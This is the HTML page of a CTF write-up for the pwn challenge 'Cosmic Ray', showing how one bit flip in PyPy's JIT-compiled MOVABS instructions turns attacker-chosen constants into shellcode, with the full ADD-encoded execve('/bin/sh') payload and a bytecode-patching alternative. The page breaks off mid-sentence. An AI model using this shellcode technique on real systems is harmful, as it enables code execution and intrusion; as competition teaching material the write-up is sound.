@@ -1,0 +1,227 @@
+<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>Cosmic Ray - Ctrl+Space Quals 2025 &#183; mhackeroni</title><meta name=title content="Cosmic Ray - Ctrl+Space Quals 2025 &#183; mhackeroni"><meta name=description content="The official writeup  for the challenge Cosmic Ray from the Ctrl+Space Quals 2025 CTF"><meta name=keywords content="pwn,ctf,ctrl,space,mhackeroni,"><link rel=canonical href=https://mhackeroni.it/writeups/2025-10-02-ctrl-space-quals-cosmic-ray/><link type=text/css rel=stylesheet href=/css/main.bundle.min.1d8c7618f0ef6623fd6ebffc2988f58f128a919c43d2ed5d99a0621768c50d3ec37bd1e02b3eb119ba92bc64d53422281addaaa107a57202376dbd6a14e2e50e.css integrity="sha512-HYx2GPDvZiP9br/8KYj1jxKKkZxD0u1dmaBiF2jFDT7De9HgKz6xGbqSvGTVNCIoGt2qoQelcgI3bb1qFOLlDg=="><script type=text/javascript src=/js/appearance.min.2a7f28406ff67c2e3fedcfa49ff1dc78cca5f4b2ace4618a279f94d3fd241566af610abcf38bb98ec3f039afc0acbb3c27e9eced17e4a072f1a98e18a628ec7e.js integrity="sha512-Kn8oQG/2fC4/7c+kn/HceMyl9LKs5GGKJ5+U0/0kFWavYQq884u5jsPwOa/ArLs8J+ns7RfkoHLxqY4Ypijsfg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.a187118b41a60744310065c567365de85730c8495301d0ebae41810cc6f7a47432b1de7d4f3b11338959f1ac50c266be6b4b73acf6bf770016eb59b602cc1aa0.js integrity="sha512-oYcRi0GmB0QxAGXFZzZd6FcwyElTAdDrrkGBDMb3pHQysd59TzsRM4lZ8axQwma+a0tzrPa/dwAW61m2AswaoA==" data-copy=Copy data-copied=Copied></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://mhackeroni.it/writeups/2025-10-02-ctrl-space-quals-cosmic-ray/"><meta property="og:site_name" content="mhackeroni"><meta property="og:title" content="Cosmic Ray - Ctrl+Space Quals 2025"><meta property="og:description" content="The official writeup  for the challenge Cosmic Ray from the Ctrl+Space Quals 2025 CTF"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2025-10-02T00:00:00+00:00"><meta property="article:modified_time" content="2025-10-02T00:00:00+00:00"><meta property="article:tag" content="Pwn"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Ctrl"><meta property="article:tag" content="Space"><meta property="article:tag" content="Mhackeroni"><meta property="og:image" content="https://mhackeroni.it/writeups/2025-10-02-ctrl-space-quals-cosmic-ray/featured.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://mhackeroni.it/writeups/2025-10-02-ctrl-space-quals-cosmic-ray/featured.png"><meta name=twitter:title content="Cosmic Ray - Ctrl+Space Quals 2025"><meta name=twitter:description content="The official writeup  for the challenge Cosmic Ray from the Ctrl+Space Quals 2025 CTF"><meta name=twitter:image content="https://mhackeroni.it/writeups/2025-10-02-ctrl-space-quals-cosmic-ray/featured.png"><meta property="og:image" content="https://mhackeroni.it/writeups/2025-10-02-ctrl-space-quals-cosmic-ray/featured.png"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"Cosmic Ray - Ctrl\u002bSpace Quals 2025","headline":"Cosmic Ray - Ctrl\u002bSpace Quals 2025","description":"The official writeup  for the challenge Cosmic Ray from the Ctrl\u002bSpace Quals 2025 CTF","inLanguage":"en","url":"https:\/\/mhackeroni.it\/writeups\/2025-10-02-ctrl-space-quals-cosmic-ray\/","author":{"@type":"Person","name":"mhackeroni"},"copyrightYear":"2025","dateCreated":"2025-10-02T00:00:00\u002b00:00","datePublished":"2025-10-02T00:00:00\u002b00:00","dateModified":"2025-10-02T00:00:00\u002b00:00","keywords":["pwn","ctf","ctrl","space","mhackeroni"],"mainEntityOfPage":"true","wordCount":"1929"}]</script><meta name=author content="mhackeroni"><link href=https://bsky.app/profile/mhackeroni.bsky.social rel=me><link href=https://www.facebook.com/mhackeroni rel=me><link href=https://github.com/mhackeroni/ rel=me><link href=https://www.linkedin.com/company/mhackeroni-inc/ rel=me><link href=https://x.com/mhackeroni rel=me><link href=https://www.youtube.com/@mhackeroni rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div><a href=/ class=flex><span class=sr-only>mhackeroni</span>
+<img src=/mhackeroni-stylized-square.webp width=1024 height=1024 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt=mhackeroni></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">mhackeroni</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>News</p></a><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Writeups</p></a><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Sponsors>Sponsors</p></a><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title="📷  Photo Gallery">Gallery</p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
+<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
+<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
+<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>News</p></a></li><li class=mt-1><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Writeups</p></a></li><li class=mt-1><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Sponsors>Sponsors</p></a></li><li class=mt-1><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="📷  Photo Gallery">Gallery</p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title></p></a></li></ul></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Cosmic Ray - Ctrl+Space Quals 2025</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-10-02T00:00:00+00:00>2 October 2025</time><span class="px-2 text-primary-500">&#183;</span><span>1929 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">10 mins</span></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><p>Author: <a href=https://github.com/mebeim target=_blank>mebeim</a> (Marco Bonelli)</p><p>Full source code of the challenge is available <a href=https://github.com/mebeim/ctf-challenges/blob/master/challenges/cosmic-ray/ target=_blank>here</a></p><blockquote><p>I had written a perfect program, when all of a sudden&mldr; a cosmic ray was
+enough to pwn my entire system :(</p></blockquote><h2 class="relative group">Description<div id=description class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#description aria-label=Anchor>#</a></span></h2><p><em>For a TL;DR of the solution, just check the comments in <a href=https://github.com/mebeim/ctf-challenges/blob/master/challenges/cosmic-ray/expl.py target=_blank><code>expl.py</code></a>.</em></p><p>The challenge consists of a simple Python 3 program (<a href=https://github.com/mebeim/ctf-challenges/blob/master/challenges/cosmic-ray/src/app.py target=_blank><code>app.py</code></a>) ran
+by the <a href=https://www.pypy.org target=_blank>PyPy</a> interpreter that implements a CLI to create and invoke
+custom Python <code>lambda</code> functions. These functions can be created using a limited
+set of whitelisted operations, take a single argument and return a single value.</p><pre tabindex=0><code class=language-none data-lang=none>Available commands:
+    [B]uild a function
+    [C]all a function
+    [L]ist functions
+    [T]rigger a cosmic ray
+
+&gt; B
+Name: foo
+Input one operation per line, end with &#34;END&#34;:
+&gt; ADD 10
+&gt; MUL 2
+&gt; REPEAT 5
+&gt; LIST
+&gt; END
+Function created!
+
+&gt; L
+Currently defined functions:
+    foo = lambda x: list(((((x) + 10) * 2) for _ in range(5)))
+
+&gt; C
+Name: foo
+Argument: 1
+Result: [22, 22, 22, 22, 22]
+</code></pre><p>Other than that, the script also offers an interesting functionality (cosmic
+ray) that allows the user to flip a bit in certain memory areas:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>where</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s1>&#39;Where? &#39;</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s1>&#39;Invalid input&#39;</span><span class=p>)</span> <span class=kn>from</span> <span class=bp>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=n>where</span> <span class=o>//</span> <span class=mi>8</span>
+</span></span><span class=line><span class=cl><span class=n>bit</span> <span class=o>=</span> <span class=n>where</span> <span class=o>%</span> <span class=mi>8</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># ... scan /proc/self/maps and calculate vaddr</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>cffi</span> <span class=kn>import</span> <span class=n>FFI</span>
+</span></span><span class=line><span class=cl><span class=n>FFI</span><span class=p>()</span><span class=o>.</span><span class=n>cast</span><span class=p>(</span><span class=s2>&#34;unsigned char *&#34;</span><span class=p>,</span> <span class=n>vaddr</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>^=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>bit</span><span class=p>)</span>
+</span></span></code></pre></div><p>This bit flip is only allowed in writeable anonymous memory areas, excluding the
+process stack, and is also only allowed once due to a global variable that is
+set after first usage.</p><h2 class="relative group">Goal<div id=goal class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#goal aria-label=Anchor>#</a></span></h2><p>The goal is clear: achieve arbitrary code execution to read the contents of the
+<code>/flag</code> file. The memory areas where the bit flip is allowed are pretty much
+limited to a handful of anonymous mappings: the interpreter heap (brk), the
+Python heap (where most Python objects live) and a RWX mapping used by PyPy to
+JIT compile Python code whenever it deems it necessary. Anything else is
+seemingly untouchable (bad permissions and/or non-anonymous).</p><pre tabindex=0><code class=language-none data-lang=none>$ sudo cat /proc/$(pidof pypy3)/maps
+5e177bf9f000-5e177bfa0000 r--p 00000000 00:43 21012271    /usr/bin/pypy3.10-c
+5e177bfa0000-5e177bfa1000 r-xp 00001000 00:43 21012271    /usr/bin/pypy3.10-c
+5e177bfa1000-5e177bfa2000 r--p 00002000 00:43 21012271    /usr/bin/pypy3.10-c
+5e177bfa2000-5e177bfa3000 r--p 00002000 00:43 21012271    /usr/bin/pypy3.10-c
+5e177bfa3000-5e177bfa4000 rw-p 00003000 00:43 21012271    /usr/bin/pypy3.10-c
+5e178c01a000-5e178c01b000 ---p 00000000 00:00 0           [heap]
+5e178c01b000-5e178c01e000 rw-p 00000000 00:00 0           [heap]
+7a2d7cf60000-7a2d7d0d0000 rw-p 00000000 00:00 0
+7a2d7d0d0000-7a2d7d1d0000 rwxp 00000000 00:00 0
+7a2d7d1f1000-7a2d7e9c3000 rw-p 00000000 00:00 0
+...
+</code></pre><p>Since the script only allows for one bit flip to happen, a viable solution must
+either achieve arbitrary code execution via a single bit flip or use the initial
+bit flip to disable the global variable check and allow for more (preferably
+unlimited) bit flips.</p><h2 class="relative group">Solution<div id=solution class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution aria-label=Anchor>#</a></span></h2><p>There are two main solution paths, although one of them remains theoretical and
+I have not spent too much time investigating its feasibility. It is however
+worth mentioning (find it below).</p><h3 class="relative group">Altering JITed Code<div id=altering-jited-code class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#altering-jited-code aria-label=Anchor>#</a></span></h3><p>As you might already know, PyPy3 is known for its ability to Just-In-Time
+compile Python code into machine code (in this case, x86-64). This is done only
+if deemed necessary by the interpreter, which means only for &ldquo;hot&rdquo; loops. For
+example, a long enough loop doing calculations or an infinite <code>while True</code> loop
+are highly likely to be JITed. The JITed code is written to and executed
+directly from a RWX memory region. This is a prime target for a &ldquo;cosmic ray&rdquo;.</p><p>We can create a &ldquo;hot&rdquo; loop within a <code>lambda</code> function with the <code>REPEAT</code>
+operation, which translates to <code>((EXPR) for _ in range(N))</code> where <code>N</code> is
+controlled and <code>EXPR</code> comes from previous operations (also controlled).</p><p>A very simple lambda built with <code>ADD 0x1122334455</code> + <code>REPEAT 9999</code> + <code>LIST</code> will
+be JITed by PyPy at a deterministic offset into the RWX JIT memory area. What&rsquo;s
+more interesting is that a large enough constant (between 5 and 8 bytes) will
+most likely get embedded <em>as is</em> into JITed code as an immediate for the x86
+MOVABS instruction (a.k.a. MOV r64, imm64). We can also notice this
+<a href=https://github.com/pypy/pypy/blob/76657ba47f6d48c7db77615d3a26bd5029f8b05a/rpython/jit/backend/x86/rx86.py#L886 target=_blank>in the PyPy codebase</a>. This is also useful to find the
+address/offset of a specific piece of JITed code from GDB:</p><pre tabindex=0><code class=language-none data-lang=none>$ sudo pwndbg --pid $(pidof pypy3)
+pwndbg&gt; search -t qword --trunc-out  73588229205
+Searching for an 8-byte integer: b&#39;UD3&#34;\x11\x00\x00\x00&#39;
+[anon_7081faf76] 0x7081faf78679 push rbp /* 0x1122334455 */
+[anon_7081faf76] 0x7081faf78945 push rbp /* 0x1122334455 */
+...
+pwndbg&gt; x/10i 0x7081faf78679 - 2
+   0x7081faf78677:    movabs r11,0x1122334455
+   0x7081faf78681:    add    rdi,r11
+   0x7081faf78684:    jo     0x7081faf78c17
+</code></pre><p>Doing simple mathematical operations with large values gives us a very good
+primitive to inject arbitrary bytes into JITed code via MOVABS. Other ways are
+definitely possible, but MOVABS gives us a lot of space. In particular, we have
+8 controlled immediate bytes ending up in a RWX region. If we can somehow flip
+some bit around the JITed code to jump into the immediate, we can use the first
+6 to run some arbitrary code, and the last two to perform a short jump into the
+immediate of a subsequent MOVABS instruction to continue.</p><p>A <code>lambda</code> built with a sequence of arithmetical instructions with large
+immediates can easily turn into a sequence of MOVABS instructions. For example:</p><pre tabindex=0><code class=language-none data-lang=none>ADD 0x1122334455
+ADD 0x2233445566
+ADD 0x3344556677
+REPEAT 10000
+LIST
+END
+</code></pre><p>Will become something like:</p><pre tabindex=0><code class=language-none data-lang=none>...
+movabs r11,0x1122334455
+add    rdi,r11
+jo     0x7bcffd7a0c87
+mov    QWORD PTR [rbx+0x28],0xe
+mov    QWORD PTR [rbp+0x158],rdi
+movabs r11,0x2233445566
+add    rdi,r11
+jo     0x7bcffd7a0ca3
+mov    QWORD PTR [rbx+0x28],0x12
+mov    QWORD PTR [rbp+0x158],rdi
+movabs r11,0x3344556677
+add    rdi,r11
+jo     0x7bcffd7a0cbf
+...
+</code></pre><p>Taking a look at how MOVABS is encoded, we have:</p><pre tabindex=0><code class=language-none data-lang=none>49 bb 55 44 33 22 11 00 00 00    movabs r11, 0x1122334455
+</code></pre><p>Flipping bit 3 of the second byte turns the instruction into:</p><pre tabindex=0><code class=language-none data-lang=none>49 b3 55    rex.WB mov r11b,  0x55
+44 33 22    xor    r12d,  DWORD PTR [rdx]
+11 00       adc    DWORD PTR [rax],  eax
+...
+</code></pre><p>Other variations are also possible, like:</p><pre tabindex=0><code class=language-none data-lang=none>49 9b       rex.WB fwait
+55          push   rbp
+44 33 22    xor    r12d,  DWORD PTR [rdx]
+11 00       adc    DWORD PTR [rax],  eax
+...
+</code></pre><p><em><code>fwait</code>&mldr; you really never stop learning new x86 instructions, huh?</em></p><p>One single bit flip is therefore enough to start executing part of the original
+MOVABS immediate we provide as code. We can encode an initial JMP ahead into the
+next immediate, perform some instructions, JMP imm8 to the next, and repeat.
+This is more than enough to pop a shell.</p><p>The only thing we must pay attention to is a small optimization performed by the
+PyPy JIT compiler when dealing with consecutive integer values that are &ldquo;close
+enough&rdquo; to each other (within 32-bit distance). Doing the same as above with
+<code>ADD 0x1122334455</code> followed by <code>ADD 0x1122334466</code> will JIT compile into:</p><pre tabindex=0><code class=language-none data-lang=none>movabs r11,0x1122334455
+add    rdi,r11
+jo     0x7a721ea94c47
+mov    QWORD PTR [rbx+0x28],0xe
+mov    QWORD PTR [rbp+0x158],rdi
+lea    r11,[r11+0x11]              &lt;&lt;&lt;&lt;&lt;&lt;
+add    rdi,r11
+jo     0x7a721ea94c63
+</code></pre><p>Not a problem if our immediates are &ldquo;far enough&rdquo; from each other in value, but
+even then, all is fine with a bit of juggling around.</p><p>Now it&rsquo;s GG. We can read in more shellcode, run existing code (we can definitely
+break ASLR now), or even just directly pop a shell via <code>execve</code>. The final
+sequence of instructions I used to call
+<code>execve("/bin/sh", {"/bin/sh", NULL}, NULL)</code> looks like this:</p><pre tabindex=0><code class=language-none data-lang=none>ADD 0x01010101011ceb90  -&gt;  jmp short $+0x1e
+ADD 0x17eb900068732f68  -&gt;  push 0x68732f               &#39;/sh\x00&#39;
+                            jmp short $+0x19
+ADD 0x17eb90102424c148  -&gt;  shl qword ptr [rsp], 16
+                            jmp short $+0x19
+ADD 0x17eb6e6924048166  -&gt;  add word ptr [rsp], 0x6e69  &#39;in&#39;
+                            jmp short $+0x19
+ADD 0x17eb90102424c148  -&gt;  shl qword ptr [rsp], 16
+                            jmp short $+0x19
+ADD 0x616161000000ede9  -&gt;  jmp $+0xf2
+ADD 0x61eb622f24048166  -&gt;  add word ptr [rsp], 0x622f  &#39;/b&#39;
+                            jmp short $+0x63
+ADD 0x61eb90006ae78948  -&gt;  mov rdi, rsp                rdi = &#34;/bin/sh&#34;
+                            push 0
+                            jmp short $+0x63
+ADD 0x61eb9090e6894857  -&gt;  push rdi
+                            mov rsi, rsp                rsi = {&#34;/bin/sh&#34;, NULL}
+                            jmp short $+0x63
+ADD 0x61eb3bb0c031d231  -&gt;  xor edx, edx                rdx = NULL
+                            xor eax, eax
+                            mov al, 0x3b                rax = __NR_execve
+                            jmp short $+0x63
+ADD 0x61eb90909090050f  -&gt;  syscall
+REPEAT 10000
+LIST
+</code></pre><p>The first instruction is changed from <code>movabs r11, 0x01010101011ceb90</code> to
+<code>rex.WB mov r11b, 0x90; jmp short $+0x1e</code>, which starts the whole thing. The
+only quirk about this solution is that after a few MOVABS instructions PyPy
+inserts additional checks in the JITed code, causing the offset between
+subsequent MOVABS to change. There is also a big gap in the middle where I have
+to waste an entire immediate to fit a JMP off32 (5 bytes). In any case, no big
+deal.</p><h3 class="relative group">Alternate Solution: Altering Python Bytecode<div id=alternate-solution-altering-python-bytecode class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#alternate-solution-altering-python-bytecode aria-label=Anchor>#</a></span></h3><p>As we all know Python is an interpreted language with an intermediate bytecode
+representation that is executed by the interpreter virtual machine. Instead of
+focusing on what happens after the PyPy JIT kicks in, we could also alter the
+Python bytecode itself. Assuming that the bytecode for script functions is
+stored in one of the memory areas we can modify, and assuming that its offset is
+fixed (or at least stable enough), flipping a bit to modify the bytecode can
+drastically modify the script&rsquo;s behavior.</p><p>There is no obvious way to use a single bit flip to obtain arbitrary [byte]code
+execution, let alone re-use some part of existing bytecode to open, read and
+print the contents of an arbitrary file. If we want to modify bytecode we will
+have to do so to bypass the single cosmic ray limit, and then use more cosmic
+rays to edit existing bytecode at will.</p><p>If we take a look at the bytecode for the <code>cosmic_ray()</code> function using
+<a href=https://docs.python.org/3/library/dis.html#dis.dis target=_blank><code>dis.dis()</code></a> we can see a few interesting spots where flipping a
+bit would result in bypassing the global variable check, allowing infinite
+&ldquo;cosmic rays&rdquo; to hit. We can also access the raw bytecode as a <code>bytes</code> object
+via <code>cosmic_ray.__code__.co_code</code> to check actual opcodes and arguments.</p><p>Some interestig opcodes to consider for the bit flip are right at the start and
+towards the end of the function:</p><pre tabindex=0><code class=language-none data-lang=none>0    LOAD_GLOBAL         0 (COSMIC_RAY_HIT)
+2    POP_JUMP_IF_FALSE   8 (to 16)
+...
+324  LOAD_CONST         22 (True)
+326  STORE_GLOBAL        0 (COSMIC_RAY_HIT)
+...
+</code></pre><p>The opcode for <code>POP_JUMP_IF_FALSE</code> is 0x72: flipping its LSB turns it into 0x73,
+which is <code>POP_JUMP_IF_TRUE</code>. This would simply negate the <code>if</code> condition and
+allow for unlimited cosmic rays after the first call to the function (which sets
+<code>COSMIC_RAY_HIT = True</code> befor return).</p><p>Similarly, changing the argument for <code>STORE_GLOBAL</code> to something other than 0
+would cause the script to create a new global variable instead of modifying
+<code>COSMIC_RAY_HIT</code>. Modifying one of the above opcodes into something else may
+also work, depending on the specific case.</p><p>There are however a couple of problems with this approach:</p><ol><li>We are working with offsets into memory, and not absolute addresses. While
+the memory layout seems pretty stable at first, the <code>cosmic_ray()</code> functions
+imports the <code>cffi</code> module, causing a bunch of mappings to be created and also
+moving existing Python objects around. This results in a not-so-predictable
+layout after the first invocation. Subsequent invocations to perform more
+bit flips would need to take this into account.</li><li>Depending on which opcode we choose to modify and how, we might end up
+crashing the interpreter either via internal check failures or plain and
+simple segmentation faults. For example, I have noticed that changing
+<code>STORE_GLOBAL 0</code> to <code>STORE_GLOBAL 8</code> (thus creating <code>FFI = True</code> globally)
+works on Ubuntu 24 <code>pypy3</code>, but crashes with a HLT for Alpine <code>pypy3</code> (used
+in the challenge container). YMMV.</li></ol><p>This is the main reason I did not explore this solution path any further. It
+does however still seem within the realm of possibility.</p><h3 class="relative group">Complete Exploit<div id=complete-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#complete-exploit aria-label=Anchor>#</a></span></h3><p>See <a href=https://github.com/mebeim/ctf-challenges/blob/master/challenges/cosmic-ray/expl.py target=_blank><code>expl.py</code></a> for the complete exploit. A simplified version is
+available at <a href=https://github.com/mebeim/ctf-challenges/blob/master/challenges/cosmic-ray/checker/__main__.py target=_blank><code>checker/__main__.py</code></a> and is intended to be
